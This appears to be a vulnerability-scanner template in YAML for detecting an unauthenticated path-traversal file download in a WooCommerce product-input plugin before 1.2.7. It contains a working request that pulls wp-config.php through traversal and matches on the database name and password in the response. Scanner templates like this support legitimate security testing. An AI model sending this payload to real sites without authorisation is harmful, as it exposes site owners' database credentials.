id: "wp-woocommerce-file-download"
name: "Product Input Fields for WooCommerce < 1.2.7 - Unauthenticated File Download"
severity: "high"
description: "WordPress WooCommerce < 1.2.7 is susceptible to file download vulnerabilities. The lack of authorization checks in the handle_downloads() function hooked to admin_init() could allow unauthenticated users to download arbitrary files from the blog using a path traversal payload."
tech:
  - "wordpress"
  - "php"
tags:
  - "wordpress"
  - "woocommerce"
  - "lfi"
  - "wp-plugin"
  - "wp"
  - "vuln"
cwe: "CWE-22"
reference: "https://wpscan.com/vulnerability/15f345e6-fc53-4bac-bc5a-de898181ea74"
spaExclusion: true
request:
  method: "GET"
  path: "/wp-admin/admin-post.php?alg_wc_pif_download_file=../../../../../wp-config.php"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "DB_NAME"
      - "DB_PASSWORD"
    condition: "and"
  - type: "status"
    status:
      - 200
